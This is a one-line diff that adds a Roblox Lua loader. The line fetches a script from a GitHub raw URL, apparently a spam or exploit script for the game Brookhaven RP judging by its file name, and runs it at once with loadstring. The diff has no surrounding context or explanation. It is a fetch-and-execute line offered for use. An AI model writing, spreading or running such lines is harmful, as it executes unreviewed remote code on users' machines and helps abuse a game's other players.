@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/brookhaven-rp-spam2-th5o9ji3oa0zsq.lua"))()
